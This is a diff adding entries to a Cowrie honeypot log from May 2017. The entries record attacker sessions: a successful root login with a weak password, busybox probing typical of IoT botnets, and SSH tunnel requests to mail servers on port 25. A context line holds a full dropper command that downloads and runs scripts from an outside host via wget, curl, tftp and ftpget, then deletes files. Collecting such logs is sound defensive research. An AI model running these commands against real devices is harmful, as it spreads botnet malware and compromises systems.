@@ -3953,3 +3953,44 @@
 2017-05-09T13:08:46+0000 [CowrieTelnetTransport,52662,82.118.242.174] login attempt [sh/cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://82.118.242.175/bins.sh; curl -O http://82.118.242.175/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 82.118.242.175 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 82.118.242.175; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 82.118.242.175 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *] failed
 2017-05-09T13:08:46+0000 [CowrieTelnetTransport,52662,82.118.242.174] Warning: state changed and new state returned
 2017-05-09T13:09:00+0000 [CowrieTelnetTransport,52662,82.118.242.174] Connection lost after 17 seconds
+2017-05-09T13:09:10+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] remote eof
+2017-05-09T13:09:10+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] remote close
+2017-05-09T13:09:10+0000 [SSHChannel None (13) on SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] sending close 13
+2017-05-09T13:09:10+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] got channel 'direct-tcpip' request
+2017-05-09T13:09:10+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] direct-tcp connection request to 74.125.28.27:25 from localhost:5556
+2017-05-09T13:09:32+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 60.187.12.133:40308 (10.8.41.81:2223) [session: TT52663]
+2017-05-09T13:09:34+0000 [CowrieTelnetTransport,52663,60.187.12.133] first time for 60.187.12.133, need: 1
+2017-05-09T13:09:34+0000 [CowrieTelnetTransport,52663,60.187.12.133] login attempt: 1
+2017-05-09T13:09:35+0000 [CowrieTelnetTransport,52663,60.187.12.133] login attempt [root/root54321] succeeded
+2017-05-09T13:09:36+0000 [CowrieTelnetTransport,52663,60.187.12.133] Opening TTY Log: log/tty/20170509-130936-None-52663i.log
+2017-05-09T13:09:36+0000 [CowrieTelnetTransport,52663,60.187.12.133] Warning: state changed and new state returned
+2017-05-09T13:09:36+0000 [SSHChannel None (14) on SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] remote eof
+2017-05-09T13:09:36+0000 [SSHChannel None (14) on SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] remote close
+2017-05-09T13:09:36+0000 [SSHChannel None (14) on SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] sending close 14
+2017-05-09T13:09:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] got channel 'direct-tcpip' request
+2017-05-09T13:09:36+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,76250,91.195.103.210] direct-tcp connection request to 74.125.28.26:25 from localhost:5556
+2017-05-09T13:09:37+0000 [CowrieTelnetTransport,52663,60.187.12.133] CMD: enable
+2017-05-09T13:09:37+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: enable 
+2017-05-09T13:09:37+0000 [CowrieTelnetTransport,52663,60.187.12.133] Reading txtcmd from "txtcmds/bin/enable"
+2017-05-09T13:09:38+0000 [CowrieTelnetTransport,52663,60.187.12.133] CMD: system
+2017-05-09T13:09:38+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command not found: system
+2017-05-09T13:09:38+0000 [CowrieTelnetTransport,52663,60.187.12.133] CMD: shell
+2017-05-09T13:09:38+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command not found: shell
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] CMD: sh
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: sh 
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] CMD:  /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne '\x0181c46036\x7f'; /bin/busybox printf '\00281c46036\177'; /bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; /bin/busybox tftp; /bin/busybox 81c46036tftp;
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: /bin/busybox wget
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: wget
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: /bin/busybox 81c46036wget
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: /bin/busybox echo -ne '\x0181c46036\x7f'
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: echo -ne '\x0181c46036\x7f'
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: /bin/busybox printf '\00281c46036\177'
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: /bin/echo -ne '\x0381c46036\x7f'
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command not found: /usr/bin/printf '\00481c46036\177'
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: /bin/busybox tftp
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: tftp
+2017-05-09T13:09:39+0000 [CowrieTelnetTransport,52663,60.187.12.133] Command found: /bin/busybox 81c46036tftp
+2017-05-09T13:09:40+0000 [CowrieTelnetTransport,52663,60.187.12.133] Closing TTY Log: log/tty/20170509-130936-None-52663i.log after 3 seconds
+2017-05-09T13:09:40+0000 [CowrieTelnetTransport,52663,60.187.12.133] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-05-09T13:09:40+0000 [CowrieTelnetTransport,52663,60.187.12.133] Connection lost after 8 seconds
